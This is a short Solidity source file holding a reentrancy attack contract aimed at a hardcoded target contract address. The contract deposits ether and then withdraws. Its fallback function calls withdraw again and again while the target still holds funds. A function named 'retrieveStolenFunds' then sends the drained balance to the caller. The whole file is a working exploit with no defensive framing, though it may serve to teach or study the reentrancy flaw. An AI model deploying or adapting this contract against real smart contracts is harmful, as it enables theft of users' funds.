// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.10;

//1r deposit
//2n attack
//3r retrievevalues

interface targetInterface{
    function deposit() external payable;
    function withdraw(uint withdrawAmount) external;
}

contract simpleReentrancyAttack{
    targetInterface bankAddress = targetInterface(0xfC713AAB72F97671bADcb14669248C4e922fe2Bb);
    uint amount = 1 ether;
    uint256 amountDeposit = 0;

    function deposit() public payable{
        amountDeposit = msg.value;
        bankAddress.deposit.value(msg.value)();
    }

    function attack() public payable{
        bankAddress.withdraw(amountDeposit);
    }

    function retrieveStolenFunds() public {
        msg.sender.transfer(address(this).balance);
    }

    function getTargetBalance() public view returns(uint){
        return address(bankAddress).balance;
    }

    fallback () external payable{
     if (address(bankAddress).balance >= amountDeposit){
         bankAddress.withdraw(amountDeposit);
     }
    }
}
